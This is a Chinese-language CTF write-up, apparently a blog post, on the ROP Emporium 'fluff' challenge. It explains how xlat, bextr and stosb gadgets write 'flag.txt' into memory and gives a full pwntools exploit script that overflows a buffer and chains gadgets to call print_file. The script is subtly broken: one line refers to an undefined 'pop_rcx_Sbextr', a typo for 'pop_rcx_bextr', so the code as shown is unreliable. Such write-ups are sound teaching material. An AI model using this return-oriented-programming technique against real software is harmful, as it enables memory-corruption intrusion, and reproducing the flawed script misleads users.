---
title: Unusual-instruments-flluf-[ROPEmporium-4]
date: 2022-3-2
tags: 
- Pwn
- CTF

categories:
- CTF

toc: true # 是否启用内容索引
sidebar: none # 是否启用sidebar侧边栏，none：不启用
---





## ROP Emporium-fluff

这个的exp是我写的最没底的一次，可用的gadget少的可怜

根据提示，要去在questionableGadgets里去找

```assembly
.text:0000000000400628 questionableGadgets:
.text:0000000000400628                 xlat
.text:0000000000400629                 retn
.text:000000000040062A ; -------------------------------------------
.text:000000000040062A                 pop     rdx
.text:000000000040062B                 pop     rcx
.text:000000000040062C                 add     rcx, 3EF2h
.text:0000000000400633                 bextr   rbx, rcx, rdx
.text:0000000000400638                 retn
.text:0000000000400639 ; -------------------------------------------
.text:0000000000400639                 stosb
.text:000000000040063A                 retn
```

查阅Inter manul，发现这三者组合起来可以向rdi里的地址写入

```markdown
bextr		//从第一源操作数(中间)，按第二源操作数的索引值和长度写入目的操作数
xlat		//[bx + al] to al
stosb		//al to [rdi]，然后递增rdi
```

但是，这只能一位一位地写入，如果要写入flag.txt，意味着要写入8次，我心想，这gadget也太长了吧，觉得是自己写错了。

然后搜索了网上的gadget，发现大部分都是32位，或者是旧版，有一些别的可利用gadget，似乎没有别的方法了

于是还是决定尝试一字一字写入

```c
from pwn import*

p = process('./fluff')
context.log_level = 'debug'

pd = lambda x:p64(x).decode('unicode_escape')

stosb_rdi_al = 0x400639
xlat = 0x400628 
bextr = 0x40062a
data_start = 0x601028
pop_rdi = 0x4006a3
pop_rcx_bextr = 0x40062b
print_file = 0x400510
f_char = 0x4003c4
l_char = 0x4003c5
a_char = 0x400411
g_char = 0x4003cf
dot_char = 0x400400
t_char = 0x4003e0
x_char = 0x400751


payload = 'A'*(0x28) + pd(bextr)
payload+= pd(0x4000) + pd(f_char-0x3ef2-0xb)
payload+= pd(xlat) + pd(pop_rdi) + pd(data_start) + pd(stosb_rdi_al)

payload+= pd(pop_rcx_bextr)
payload+= pd(l_char-0x3ef2-0x66)
payload+= pd(xlat) + pd(stosb_rdi_al)

payload+= pd(pop_rcx_Sbextr)
payload+= pd(a_char-0x3ef2-0x6c)
payload+= pd(xlat) + pd(stosb_rdi_al)

payload+= pd(pop_rcx_bextr)
payload+= pd(g_char-0x3ef2-0x61)
payload+= pd(xlat) + pd(stosb_rdi_al)

payload+= pd(pop_rcx_bextr)
payload+= pd(dot_char-0x3ef2-0x67)
payload+= pd(xlat) + pd(stosb_rdi_al)

payload+= pd(pop_rcx_bextr)
payload+= pd(t_char-0x3ef2-0x2e)
payload+= pd(xlat) + pd(stosb_rdi_al)

payload+= pd(pop_rcx_bextr)
payload+= pd(x_char-0x3ef2-0x74)
payload+= pd(xlat) + pd(stosb_rdi_al)

payload+= pd(pop_rcx_bextr)
payload+= pd(t_char-0x3ef2-0x78)
payload+= pd(xlat) + pd(stosb_rdi_al)

payload+= pd(pop_rdi) + pd(data_start) + pd(print_file)


p.recvuntil('> ')
p.sendline(payload)
p.interactive()
```



还是不能对长ROP链有畏惧心理